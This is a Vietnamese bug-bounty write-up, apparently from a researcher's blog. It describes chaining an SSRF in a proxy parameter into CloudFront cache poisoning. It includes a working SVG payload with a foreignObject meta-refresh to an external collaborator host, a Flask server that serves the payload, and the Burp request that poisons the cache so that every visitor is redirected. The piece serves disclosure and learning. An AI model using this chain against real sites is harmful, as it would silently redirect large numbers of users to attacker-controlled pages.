---
date: 2025-05-04 10:15:00
---

# SSRF-induced Cache Poisoning Logic Bug Flaw

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/1.jpg)

---
## 1. Lỗ Hổng Server-Side Request Forgery(SSRF) Dẫn Đến Cache Poisoning

Lỗ hổng Server-Side Request Forgery (SSRF) được phát hiện trong tham số `url` với chức năng `Proxy Controller`. Nguyên nhân là do ứng dụng thiếu cơ chế xác thực và ủy quyền hiệu quả, cho phép bất kỳ người dùng nào cũng có thể sử dụng chức năng này.

Kẻ tấn công có thể lợi dụng lỗ hổng bằng cách cung cấp một domain tùy ý `(attacker domain)`, buộc máy chủ phải tương tác với các dịch vụ bên ngoài. Tuy nhiên, lỗ hổng này không thể được khai thác để truy cập các tài nguyên nội bộ của máy chủ (như localhost) do ứng dụng đã có bộ lọc `(filter)`.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/0.jpg)

Vì lý do đó, `Bugcrowd` đã hạ mức độ nghiêm trọng của lỗ hổng xuống `P5 (Informational)`, chỉ mang tính chất thông tin thay vì là một rủi ro bảo mật nghiêm trọng.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/2.png)

---
## 2. Lỗ Hổng Cache Poisoning 

Lỗ hổng Cache Poisoning được phát hiện qua phản hồi của server. Các header như `X-Cache: Hit from CloudFront` và `Age: 5` cùng với `Status 200 OK` cho thấy server đang sử dụng CDN (Content Delivery Network) và nội dung đang được cache.

Ban đầu, khi thử thay đổi `Content-Type` trong header của server độc hại thành `text/html`, server trả về `Status 400 Bad Request` vì không chấp nhận loại nội dung này.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/4.jpg)

Tuy nhiên, khi chuyển sang sử dụng `Content-Type: image/svg+xml`, server đã phản hồi với `Status 200 OK`. Điều này chứng tỏ server chấp nhận và xử lý thành công loại nội dung này, mở ra khả năng khai thác lỗ hổng.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/3.jpg)

Kết quả là, tôi đã tấn công Cache Poisoning thành công.

Tuy nhiên, sau khi nghiên cứu sâu hơn, tôi nhận thấy lỗ hổng này mang tính chất Logic Bug Flaw. Cụ thể, server chỉ cho phép gửi yêu cầu đến một endpoint tối đa 3 lần. Sau 3 lần đó, cache sẽ được lưu lại vĩnh viễn. Khi người dùng khác truy cập vào endpoint này, server sẽ luôn phục vụ nội dung độc hại đã được lưu trong cache từ trước, thay vì xử lý yêu cầu mới. Đây chính là điểm yếu trong logic của ứng dụng.

Lưu ý: Tôi đã sử dụng công cụ [requestrepo.com](https://requestrepo.com/) để chỉnh sửa các header trong quá trình thử nghiệm.
![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/5.png)

---
## 3. Tác Động và Kịch Bản Tấn Công (Impact & Attack Scenario)

### Tác Động (Impact)

Mặc dù lỗ hổng `Cache Poisoning` cho phép kẻ tấn công chèn nội dung độc hại vào bộ nhớ `cache`, nhưng việc khai thác trực tiếp để thực hiện `XSS Stored` đã bị chặn bởi chính sách bảo mật nội dung `CSP (Content Security Policy)` của hệ thống. Vì vậy, tôi đã chuyển hướng nghiên cứu để tìm một kịch bản tấn công khác khả thi hơn.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/8.png)

Sau khi phân tích, tôi nhận thấy có thể tận dụng khả năng chèn nội dung HTML để gây ra tấn công `Chuyển Hướng Mở (Open Redirect)` bằng cách sử dụng `meta tag`.

### Kịch Bản Tấn Công (Attack Scenario)

Để chứng minh kịch bản này, tôi đã thiết lập một máy chủ độc hại để lưu lại nhật ký truy cập (log).

Tôi đã tạo một file poc.xml trên máy chủ độc hại với nội dung sau:

`poc.xml`
```xml
<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
  <foreignObject width="100%" height="100%">
    <body xmlns="http://www.w3.org/1999/xhtml">
      <meta http-equiv="refresh" content="0; url=https://wcc9fwntbs9o7upj4haqmnxi0960uqif.oastify.com/" />
    </body>
  </foreignObject>
</svg>
```

File này thực chất là một `SVG (một dạng XML)` có chứa thẻ `<foreignObject>`, cho phép nhúng nội dung HTML. Nhờ `namespace http://www.w3.org/1999/xhtml`, thẻ `<meta http-equiv="refresh">` sẽ được trình duyệt của người dùng xử lý, buộc họ tự động chuyển hướng đến một URL do kẻ tấn công chỉ định.

### Quá trình khai thác:

1. Tôi đã thiết lập máy chủ độc hại bằng Flask để phục vụ file `poc.xml` với `header Content-Type: image/svg+xml`. 
```python
from flask import Flask, make_response
import os

app = Flask(__name__)

@app.route('/poc.xml')
def serve_svg_as_xml():
    file_path = os.path.join(os.getcwd(), 'poc.xml')
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            response = make_response(f.read())
            response.headers.set('Content-Type', 'image/svg+xml')
            return response
    else:
        return "File poc.xml not found!", 404

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5505)
```

2. Sử dụng `Burp Suite Repeater`, tôi lợi dụng lỗ hổng `SSRF` bằng cách cung cấp địa chỉ của máy chủ độc hại `(http://{ip}:{port}/poc.xml) `vào tham số `u`.
```http
GET /media?u=http://Ip-Demo:5505/poc.xml HTTP/2 
Host: VulnWeb-demo.com 
Cookie: None
Sec-Ch-Ua: "Chromium";v="135", "Not-A.Brand";v="8" Sec-Ch-Ua-Mobile: ?0 Sec-Ch-Ua-Platform: "Windows" Accept-Language: en-US,en;q=0.9 
Upgrade-Insecure-Requests: 1 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 
Sec-Fetch-Dest: document 
Accept-Encoding: gzip, deflate, br 
Priority: u=0, i
```

3. Khi server dễ bị tổn thương `(VulnWeb-demo.com)` thực hiện yêu cầu, nó sẽ lấy toàn bộ nội dung từ `file poc.xml` của tôi và lưu vào `cache`.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/6.jpg)

4. Kết quả là, server đã trả về nội dung độc hại từ máy chủ của tôi.

![alt text](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/7.jpg)

## 4. Flow diagram

### Một số lưu ý về lỗ hổng
Lỗ hổng này có thể dẫn đến tấn công Open Redirect, nghe có vẻ low-impact, nhưng vấn đề nằm ở chỗ payload có thể được lưu vĩnh viễn trong cache. Điều này khiến mỗi khi người dùng truy cập vào endpoint đó, họ đều bị chuyển hướng, tạo ra một cuộc tấn công hàng loạt.

![alt text](https://mermaid.ink/img/pako:eNp9kV9PwjAUxb9Kcw1viIx_gz6YwBCMYmLEoHHzoWyXrbFrsXQGJfvudgUMJsY-9d7fOec2tzuIVYJAoVbbcckNJbtIEhKByTDHCKi9JrhihTAR1E_QgmnOlgI3lcZ5KrRS0sz518Ho9dbbg-sIn5CnmdnjpRLJCTa4NYESSu_pWdOdE4HgEv8VYJLijC1RjFj8lmpVSJtPrXLlTgSVsIxkWdZqkUw1W2dk9lA1h-GCx488fyXn55fkJnzA9wI3Zl-OwkCoIplo-_7XSn0VzlF_oCZDY-wk1HvdbXjHBI-5Kjbkd0BlGrlrcLC6nMC1xuG9VttPMkETZ2TMDHNw7OB1GExIwOIMyU-4w9cOT09GzhfTi-e7maNTR4dQh1TzBKjRBdYhR52zqoQ_Ppnpt2pBpfWsmXxRKj_a7CLTDOiKiY2tinXCDI45s_vLf7oaZYI6sCs3QNt-14UA3cEWaN9r9Pp-p9dp-l3fG3gWflpRq9Xo9Hyv3ep3297A98s6fLmpzUbf75bfvnzLWw)

## 5. Link Tham Khảo:

[https://www.w3.org/TR/SVG11/](https://www.w3.org/TR/SVG11/)

[https://www.w3.org/TR/xhtml1/](https://www.w3.org/TR/xhtml1/)

[https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/Getting_Started#serving_svg](https://developer.mozilla.org/en-US/docs/Web/SVG/Tutorial/Getting_Started#serving_svg)

[https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)

[https://owasp.org/www-community/attacks/Server_Side_Request_Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)


## 6. Proof-of-Concept (POC) - Video

![](https://thewindghost.github.io/posts/image-post/cache-poisoning-via-fetching-data/video.gif)

